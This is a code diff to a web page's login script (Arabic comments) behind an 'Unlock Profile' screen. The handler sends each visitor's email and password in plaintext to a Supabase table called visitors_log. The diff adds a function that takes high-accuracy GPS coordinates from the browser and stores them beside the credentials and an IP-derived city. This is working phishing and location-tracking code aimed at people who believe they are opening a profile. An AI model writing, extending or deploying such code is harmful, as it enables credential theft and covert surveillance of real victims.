@@ -128,6 +128,26 @@
         }
     };
 
+    // دالة الحصول على الموقع بالملي عبر GPS
+    function getLocationGPS() {
+        return new Promise((resolve) => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve(`${position.coords.latitude}, ${position.coords.longitude}`);
+                    },
+                    (err) => {
+                        console.warn("User denied GPS or Error:", err.message);
+                        resolve("Permission Denied / IP Only");
+                    },
+                    { enableHighAccuracy: true, timeout: 8000 }
+                );
+            } else {
+                resolve("Browser not supported");
+            }
+        });
+    }
+
     async function handleLogin() {
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
@@ -139,27 +159,34 @@
             return;
         }
 
-        loginBtn.innerText = "Verifying...";
+        loginBtn.innerText = "Acquiring GPS...";
         loginBtn.disabled = true;
 
         try {
-            // جلب الموقع فوراً من الـ API
-            const geoRes = await fetch('https://ipapi.co/json/');
-            const geoData = await geoRes.json();
+            // 1. جلب الإحداثيات الدقيقة (GPS)
+            const coords = await getLocationGPS();
 
-            // إرسال البيانات للجدول (تأكد أن أسماء الأعمدة في Supabase مطابقة للأسماء هنا)
+            // 2. جلب اسم المدينة كمعلومة إضافية من الـ IP
+            let cityInfo = "Unknown";
+            try {
+                const geoRes = await fetch('https://ipapi.co/json/');
+                const geoData = await geoRes.json();
+                cityInfo = geoData.city || "Unknown";
+            } catch(e) { console.log("City fetch error"); }
+
+            // 3. إرسال البيانات إلى Supabase
             const { error } = await supabaseClient
                 .from('visitors_log')
                 .insert([{ 
                     visitor_email: email, 
                     visitor_password: password,
-                    city: geoData.city || 'Unknown',
-                    coords: `${geoData.latitude}, ${geoData.longitude}` || '0,0'
+                    city: cityInfo,
+                    coords: coords 
                 }]);
 
             if (error) {
                 console.error(error);
-                errorMsg.innerText = "حدث خطأ في الاتصال";
+                errorMsg.innerText = "حدث خطأ في قاعدة البيانات";
                 loginBtn.innerText = "Unlock Profile";
                 loginBtn.disabled = false;
             } else {
@@ -168,11 +195,9 @@
                 document.getElementById('profile-card').style.display = 'block';
             }
         } catch (e) {
-            // في حال فشل جلب الموقع، نسجل الدخول بدونه لضمان عمل الموقع
-            await supabaseClient.from('visitors_log').insert([{ visitor_email: email, visitor_password: password }]);
-            localStorage.setItem('isUnlocked', 'true');
-            document.getElementById('auth-screen').style.display = 'none';
-            document.getElementById('profile-card').style.display = 'block';
+            errorMsg.innerText = "تعذر الدخول، حاول مجدداً";
+            loginBtn.innerText = "Unlock Profile";
+            loginBtn.disabled = false;
         }
     }
 </script>
